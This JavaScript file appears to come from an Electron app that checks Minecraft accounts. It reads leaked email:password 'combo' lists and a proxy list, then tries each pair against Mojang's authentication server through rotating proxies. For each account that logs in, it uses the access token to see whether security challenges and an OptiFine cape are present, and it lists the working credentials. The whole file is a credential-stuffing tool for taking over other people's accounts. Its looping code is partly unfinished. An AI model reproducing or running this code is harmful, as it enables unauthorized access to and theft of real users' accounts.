const $ = require('jquery');
const fs = require('fs');

var HttpsProxyAgent = require('https-proxy-agent');


$("form").on("change", "#input-combos", function () {
    $(this).parent(".file-upload-wrapper").attr("data-text", $(this).val().replace(/.*(\/|\\)/, ''));
});


var combo_accounts = [];
var combo_proxy = [];
var current_proxy = 0;

document.getElementById("input-combos").addEventListener("change", (e) => {

    const combo = fs.readFileSync(e.target.files[0].path, 'utf-8')

    var combo_list = combo.split("\n");

    combo_list.forEach((a, k) => {
        if (a != "" && a.length > 0 && a.split(":").length == 2) {
            var acc_item = {
                account: a.split(":")[0],
                pass: a.split(":")[1]
            }
            var account_item = `<div class="account-item">
            <p>${acc_item.account}</p>
            <p>${acc_item.pass}</p>
            </div>`
            $(account_item).appendTo("#accounts-wrapper");
            combo_accounts[k] = acc_item;
        }
    })
})

document.getElementById("input-proxy").addEventListener("change", (e) => {

    const combo = fs.readFileSync(e.target.files[0].path, 'utf-8')

    var combo_list = combo.split("\n");
    combo_list.forEach((a, k) => {
        if (a != "" && a.length > 0 && a.split(":").length == 2) {
            var acc_item = {
                host: a.split(":")[0],
                port: a.split(":")[1]
            }
            combo_proxy[k] = acc_item;
            e.target.parentElement.setAttribute("data-text", combo_proxy.length + " Proxies loaded")
        }
    })
});

var good_count = document.getElementById("good-count");
var test_count = document.getElementById("test-count");
var error_count = document.getElementById("error-count");


document.getElementById("start-button").addEventListener("click", (e) => {
    checkAccounts();
})

var timeout = document.getElementById("timeout");
var timeout_time = 0;
var remaining_time = timeout_time;
document.addEventListener("DOMContentLoaded", function(event) {
    console.log("DOM fully loaded and parsed");
  });
timeout.addEventListener("change", (e) => {
    timeout_time = e.target.value;
    document.getElementById("timeout-time").innerText = "Timeout (seconds): " + timeout_time
})

async function checkAccounts() {
    var test = 0;
    var good = 0;
    var list_error = 0;
    var list_good = []

    setTimeout(async () => {
        var a = combo_accounts[test];
        console.log(a);
        
        test++;
        test_count.innerText = "Tested: " + test;
        var account = await tryAccount(a.account, a.pass, combo_proxy[current_proxy].host + ":" + combo_proxy[current_proxy].port);

        if (account.ok) {
            var jjson = await account.json();

            var challengesandcape = await fetchChallengesAndCapes(jjson.selectedProfile.name, jjson.accessToken, combo_proxy[current_proxy].host + ":" + combo_proxy[current_proxy].port)

            good++;
            good_count.innerText = "Good: " + good;

            var newList = { a, "haschallenges": challengesandcape.c, "hascape": challengesandcape.ca };

            list_good.push(newList);

            var account_item = `<div class="account-item">
            <p>${a.account}</p>
            <p>${a.pass}</p>
            <p>${challengesandcape.c}</p>
            <p>${challengesandcape.ca}</p>
            </div>`
            $(account_item).appendTo("#combos-output");

        } else {
            list_error++;
            error_count.innerText = "Error: " + list_error;
            current_proxy++;

        }
    }, timeout_time * 1000)

    combo_accounts.every(async (a, k, _combo) => {
      
    })




}

async function tryAccount(email, password, proxy) {
    console.log(proxy);

    const data = JSON.stringify({
        "agent": {
            "name": "Minecraft",
            "version": 1
        },
        "username": email,
        "password": password,
        "requestUser": true
    })

    var account = await fetch("https://authserver.mojang.com/authenticate", {
        method: 'POST',
        agent: new HttpsProxyAgent('http://' + proxy),
        body: data,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Content-Type': 'application/json'
        },
    })

    return account;
}

async function fetchChallengesAndCapes(user, accesstoken, proxy) {
    console.log(user, accesstoken);

    return new Promise((resolve, reject) => {
        var challenges;
        var cape;
        fetch("https://api.mojang.com/user/security/challenges", {
            method: 'GET',
            agent: new HttpsProxyAgent('http://' + proxy),
            headers: {
                "authorization": "Bearer " + accesstoken,
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
        }).then(json => { return json.json() })
            .then(res => {
                challenges = res.length > 0;
                fetch(`http://s.optifine.net/capes/${user}.png`, {
                    method: 'GET',
                    agent: new HttpsProxyAgent('http://' + proxy),
                    headers: {
                        'Access-Control-Allow-Origin': '*',
                    }
                }).then(res => {
                    cape = res.ok;

                    resolve({ c: challenges, ca: cape });
                }).catch(() => {

                })

            })

    });
}